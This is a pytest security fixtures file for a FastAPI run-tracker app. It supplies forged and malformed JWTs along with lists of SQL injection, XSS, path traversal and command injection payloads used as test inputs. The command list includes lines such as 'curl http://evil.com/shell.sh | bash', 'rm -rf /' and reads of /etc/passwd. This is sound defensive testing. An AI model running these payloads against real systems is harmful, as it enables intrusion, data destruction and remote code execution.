"""Security test fixtures and helpers for comprehensive security testing."""

import sys
from pathlib import Path

# Add src directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent.parent / "src"))

import pytest
import jwt
from datetime import datetime, timezone, timedelta
from uuid import uuid4
from unittest.mock import Mock, patch
from fastapi.testclient import TestClient
from sqlalchemy.orm import Session

from soullink_tracker.main import app
from soullink_tracker.db.models import Run, Player
from soullink_tracker.auth.security import hash_password, generate_secure_token
from soullink_tracker.auth.jwt_auth import JWTTokenManager


class SecurityTestHelper:
    """Helper class for security testing operations."""

    @staticmethod
    def create_malicious_jwt_token(
        secret_key: str = "wrong-secret", algorithm: str = "HS256"
    ) -> str:
        """Create a JWT token with malicious or incorrect parameters."""
        payload = {
            "sub": str(uuid4()),
            "run_id": str(uuid4()),
            "player_name": "MaliciousUser",
            "exp": datetime.now(timezone.utc) + timedelta(hours=1),
            "type": "access",
        }
        return jwt.encode(payload, secret_key, algorithm=algorithm)

    @staticmethod
    def create_expired_jwt_token(secret_key: str, expiry_minutes: int = -5) -> str:
        """Create an expired JWT token."""
        payload = {
            "sub": str(uuid4()),
            "run_id": str(uuid4()),
            "player_name": "ExpiredUser",
            "exp": datetime.now(timezone.utc) + timedelta(minutes=expiry_minutes),
            "type": "access",
        }
        return jwt.encode(payload, secret_key, algorithm="HS256")

    @staticmethod
    def create_malformed_jwt_tokens() -> list:
        """Create various malformed JWT tokens for testing."""
        return [
            "not.a.jwt",
            "header.payload",  # Missing signature
            "a.b.c.d",  # Too many parts
            "",  # Empty token
            "Bearer token",  # Wrong format
            "malformed-token-string",
        ]

    @staticmethod
    def get_sql_injection_payloads() -> list:
        """Get common SQL injection attack payloads."""
        return [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM passwords --",
            "admin'--",
            "' OR 1=1 --",
            "'; INSERT INTO admin VALUES('hacker'); --",
            "' OR 'x'='x",
            "'; DELETE FROM sessions; --",
            "1' OR '1'='1' /*",
            "' OR ''='",
            "1'; EXEC xp_cmdshell('dir'); --",
        ]

    @staticmethod
    def get_xss_payloads() -> list:
        """Get common XSS attack payloads."""
        return [
            "<script>alert('xss')</script>",
            "javascript:alert(1)",
            "<img src=x onerror=alert(1)>",
            "\"><script>alert('xss')</script>",
            "'><script>alert(String.fromCharCode(88,83,83))</script>",
            "\";alert('xss');//",
            "<svg onload=alert(1)>",
            "<%2fscript%3e%3cscript%3ealert('xss')%3c%2fscript%3e",
            '<iframe src="javascript:alert(1)"></iframe>',
            '<object data="javascript:alert(1)">',
            '<embed src="javascript:alert(1)">',
            '<link rel="stylesheet" href="javascript:alert(1)">',
        ]

    @staticmethod
    def get_path_traversal_payloads() -> list:
        """Get common path traversal attack payloads."""
        return [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32",
            "....//....//....//etc//passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "/var/www/../../etc/passwd",
            "....\\....\\....\\etc\\passwd",
        ]

    @staticmethod
    def get_command_injection_payloads() -> list:
        """Get common command injection attack payloads."""
        return [
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "&& cat /etc/passwd",
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",
            "; rm -rf /",
            "| rm -rf /",
            "&& rm -rf /",
            "; nc -l 4444",
            "| nc -l 4444",
            "; wget http://evil.com/malware",
            "| curl http://evil.com/shell.sh | bash",
            "; python -c 'import os; os.system(\"whoami\")'",
            "&& python -c 'import socket,subprocess,os'",
        ]

    @staticmethod
    def get_cors_malicious_origins() -> list:
        """Get malicious origins for CORS testing."""
        return [
            "http://evil.com",
            "https://malicious-site.com",
            "http://attacker.localhost",
            "https://phishing.example.com",
            "null",
            "data:",
            "file://",
            "javascript:",
            "vbscript:",
            "about:blank",
            "chrome-extension://",
            "moz-extension://",
        ]

    @staticmethod
    def get_rate_limit_test_scenarios() -> list:
        """Get rate limiting test scenarios."""
        return [
            {"endpoint": "/v1/auth/login", "method": "POST", "expected_limit": 10},
            {"endpoint": "/v1/auth/jwt-login", "method": "POST", "expected_limit": 10},
            {"endpoint": "/v1/auth/refresh", "method": "POST", "expected_limit": 10},
            {"endpoint": "/v1/events", "method": "POST", "expected_limit": 60},
            {"endpoint": "/v1/runs", "method": "GET", "expected_limit": 60},
        ]

    @staticmethod
    def create_security_test_headers() -> dict:
        """Create headers for security testing."""
        return {
            "User-Agent": "SecurityTestBot/1.0",
            "Accept": "application/json",
            "Content-Type": "application/json",
            "X-Forwarded-For": "192.168.1.100",
            "X-Real-IP": "192.168.1.100",
        }

    @staticmethod
    def validate_security_response(
        response, expected_status_codes: list = None
    ) -> dict:
        """Validate security response and return analysis."""
        if expected_status_codes is None:
            expected_status_codes = [200, 400, 401, 403, 404, 422, 429]

        analysis = {
            "status_valid": response.status_code in expected_status_codes,
            "content_type_secure": False,
            "no_information_disclosure": True,
            "proper_error_format": True,
        }

        # Check content type
        content_type = response.headers.get("content-type", "")
        if (
            "application/json" in content_type
            or "application/problem+json" in content_type
        ):
            analysis["content_type_secure"] = True

        # Check for information disclosure
        response_text = response.text.lower()
        disclosure_indicators = [
            "sql",
            "database error",
            "stack trace",
            "/home/",
            "/usr/",
            "internal server error",
            "debug",
            "exception",
            "traceback",
        ]

        for indicator in disclosure_indicators:
            if indicator in response_text and "error" not in response_text:
                analysis["no_information_disclosure"] = False
                break

        return analysis


@pytest.fixture
def security_helper():
    """Provide security test helper instance."""
    return SecurityTestHelper()


@pytest.fixture
def security_test_client():
    """Create test client specifically configured for security testing."""
    return TestClient(app)


@pytest.fixture
def mock_jwt_manager():
    """Create mocked JWT manager for security testing."""
    with patch("soullink_tracker.auth.jwt_auth.get_config") as mock_get_config:
        mock_config = Mock()
        mock_config.app.jwt_secret_key = "test-security-secret-key"
        mock_config.app.jwt_access_token_expires_minutes = 15
        mock_config.app.jwt_refresh_token_expires_days = 30
        mock_get_config.return_value = mock_config
        return JWTTokenManager()


@pytest.fixture
def security_test_run_and_player(db_session: Session):
    """Create test run and player for security testing."""
    password = "security_test_password_123"
    salt_hex, hash_hex = hash_password(password)

    run = Run(
        id=uuid4(),
        name="Security Test Run",
        rules_json={"dupes_clause": True, "security_test": True},
        password_salt=salt_hex,
        password_hash=hash_hex,
    )

    db_session.add(run)
    db_session.commit()
    db_session.refresh(run)

    # Create player
    session_token, token_hash = generate_secure_token()

    player = Player(
        id=uuid4(),
        run_id=run.id,
        name="SecurityTestPlayer",
        game="HeartGold",
        region="Johto",
        token_hash=token_hash,
    )

    db_session.add(player)
    db_session.commit()
    db_session.refresh(player)

    # Store plain password for testing
    run._plain_password = password
    player._session_token = session_token

    return run, player


@pytest.fixture
def authenticated_security_client(
    security_test_client, mock_jwt_manager, security_test_run_and_player
):
    """Create authenticated client for security testing."""
    run, player = security_test_run_and_player

    # Create JWT token
    access_token, _, _, _ = mock_jwt_manager.create_tokens(
        player_id=player.id, run_id=run.id, player_name=player.name
    )

    headers = {"Authorization": f"Bearer {access_token}"}
    return security_test_client, headers, str(run.id), str(player.id)


@pytest.fixture
def malicious_request_scenarios(security_helper):
    """Provide various malicious request scenarios for testing."""
    return {
        "sql_injection": security_helper.get_sql_injection_payloads(),
        "xss_attacks": security_helper.get_xss_payloads(),
        "path_traversal": security_helper.get_path_traversal_payloads(),
        "command_injection": security_helper.get_command_injection_payloads(),
        "malicious_origins": security_helper.get_cors_malicious_origins(),
    }


@pytest.fixture
def security_attack_vectors():
    """Provide comprehensive attack vectors for security testing."""
    return {
        "authentication_bypass": [
            {"token": "invalid-token", "expected_status": 401},
            {"token": "", "expected_status": 401},
            {"token": "Bearer", "expected_status": 401},
            {"token": "Basic dXNlcjpwYXNz", "expected_status": 401},
        ],
        "authorization_escalation": [
            {"user_role": "player", "access_admin": False},
            {"user_role": "guest", "access_player_data": False},
        ],
        "data_exfiltration": [
            {"endpoint": "/v1/runs", "should_require_auth": True},
            {"endpoint": "/v1/admin/users", "should_be_restricted": True},
        ],
        "dos_attacks": [
            {"type": "rate_limiting", "rapid_requests": 100},
            {"type": "large_payload", "payload_size": 10000000},  # 10MB
            {"type": "recursive_data", "nested_levels": 1000},
        ],
    }


@pytest.fixture
def security_compliance_checklist():
    """Provide security compliance checklist for validation."""
    return {
        "authentication": {
            "jwt_secret_rotation": "Should support JWT secret rotation",
            "token_expiry": "Tokens should expire appropriately",
            "secure_storage": "Passwords should be hashed with salt",
            "rate_limiting": "Auth endpoints should be rate limited",
        },
        "authorization": {
            "role_based_access": "Should enforce role-based access control",
            "resource_isolation": "Users should only access own resources",
            "admin_protection": "Admin endpoints should be protected",
        },
        "input_validation": {
            "sql_injection_prevention": "Should prevent SQL injection",
            "xss_prevention": "Should prevent XSS attacks",
            "path_traversal_prevention": "Should prevent path traversal",
            "command_injection_prevention": "Should prevent command injection",
        },
        "transport_security": {
            "cors_policy": "Should enforce CORS policy",
            "secure_headers": "Should include security headers",
            "content_type_validation": "Should validate content types",
        },
        "error_handling": {
            "information_disclosure": "Should not disclose sensitive information",
            "consistent_errors": "Should return consistent error formats",
            "proper_status_codes": "Should use appropriate HTTP status codes",
        },
        "logging_monitoring": {
            "security_events": "Should log security events",
            "audit_trails": "Should maintain audit trails",
            "anomaly_detection": "Should detect security anomalies",
        },
    }


class SecurityTestScenario:
    """Security test scenario builder."""

    def __init__(self, name: str, description: str):
        self.name = name
        self.description = description
        self.steps = []
        self.expected_results = []

    def add_step(
        self,
        action: str,
        endpoint: str,
        method: str = "GET",
        data: dict = None,
        headers: dict = None,
        expected_status: int = None,
    ):
        """Add a test step to the scenario."""
        step = {
            "action": action,
            "endpoint": endpoint,
            "method": method,
            "data": data or {},
            "headers": headers or {},
            "expected_status": expected_status,
        }
        self.steps.append(step)
        return self

    def expect_security_compliance(self, compliance_type: str, details: str):
        """Add security compliance expectation."""
        self.expected_results.append(
            {
                "type": "security_compliance",
                "compliance_type": compliance_type,
                "details": details,
            }
        )
        return self

    def expect_attack_prevention(self, attack_type: str, prevention_mechanism: str):
        """Add attack prevention expectation."""
        self.expected_results.append(
            {
                "type": "attack_prevention",
                "attack_type": attack_type,
                "prevention_mechanism": prevention_mechanism,
            }
        )
        return self


@pytest.fixture
def security_test_scenarios():
    """Provide predefined security test scenarios."""
    scenarios = []

    # Authentication bypass scenario
    auth_bypass = SecurityTestScenario(
        "Authentication Bypass", "Test various authentication bypass attempts"
    )
    auth_bypass.add_step(
        "login_attempt",
        "/v1/auth/login",
        "POST",
        {"run_name": "test", "player_name": "hacker", "password": "wrong"},
        expected_status=401,
    )
    auth_bypass.expect_attack_prevention("auth_bypass", "credential_validation")
    scenarios.append(auth_bypass)

    # SQL injection scenario
    sql_injection = SecurityTestScenario(
        "SQL Injection", "Test SQL injection prevention across endpoints"
    )
    sql_injection.add_step(
        "injection_attempt",
        "/v1/runs/'; DROP TABLE users; --/encounters",
        "GET",
        expected_status=422,
    )
    sql_injection.expect_attack_prevention("sql_injection", "parameterized_queries")
    scenarios.append(sql_injection)

    # XSS prevention scenario
    xss_prevention = SecurityTestScenario(
        "XSS Prevention", "Test XSS attack prevention"
    )
    xss_prevention.add_step(
        "xss_attempt",
        "/v1/auth/login",
        "POST",
        {
            "run_name": "<script>alert('xss')</script>",
            "player_name": "test",
            "password": "test",
        },
        expected_status=401,
    )
    xss_prevention.expect_attack_prevention("xss", "input_sanitization")
    scenarios.append(xss_prevention)

    return scenarios


@pytest.fixture
def security_metrics_collector():
    """Provide security metrics collection for test analysis."""

    class SecurityMetricsCollector:
        def __init__(self):
            self.metrics = {
                "auth_failures": 0,
                "injection_attempts": 0,
                "blocked_requests": 0,
                "security_errors": 0,
                "compliance_checks": 0,
                "vulnerabilities_found": [],
            }

        def record_auth_failure(self, details: str):
            self.metrics["auth_failures"] += 1

        def record_injection_attempt(self, attack_type: str, blocked: bool):
            self.metrics["injection_attempts"] += 1
            if blocked:
                self.metrics["blocked_requests"] += 1

        def record_security_error(self, error_type: str, details: str):
            self.metrics["security_errors"] += 1

        def record_vulnerability(
            self, vulnerability_type: str, severity: str, details: str
        ):
            self.metrics["vulnerabilities_found"].append(
                {
                    "type": vulnerability_type,
                    "severity": severity,
                    "details": details,
                    "timestamp": datetime.now(timezone.utc),
                }
            )

        def get_security_summary(self) -> dict:
            return {
                "total_tests": sum(
                    [
                        self.metrics["auth_failures"],
                        self.metrics["injection_attempts"],
                        self.metrics["compliance_checks"],
                    ]
                ),
                "blocked_attacks": self.metrics["blocked_requests"],
                "security_score": self._calculate_security_score(),
                "vulnerabilities": len(self.metrics["vulnerabilities_found"]),
                "high_severity_vulns": len(
                    [
                        v
                        for v in self.metrics["vulnerabilities_found"]
                        if v["severity"] == "high"
                    ]
                ),
            }

        def _calculate_security_score(self) -> float:
            total_attempts = max(1, self.metrics["injection_attempts"])
            blocked_ratio = self.metrics["blocked_requests"] / total_attempts
            vuln_penalty = len(self.metrics["vulnerabilities_found"]) * 0.1
            return max(0.0, min(1.0, blocked_ratio - vuln_penalty))

    return SecurityMetricsCollector()


# Export all fixtures and helpers for easy import
__all__ = [
    "SecurityTestHelper",
    "SecurityTestScenario",
    "security_helper",
    "security_test_client",
    "mock_jwt_manager",
    "security_test_run_and_player",
    "authenticated_security_client",
    "malicious_request_scenarios",
    "security_attack_vectors",
    "security_compliance_checklist",
    "security_test_scenarios",
    "security_metrics_collector",
]
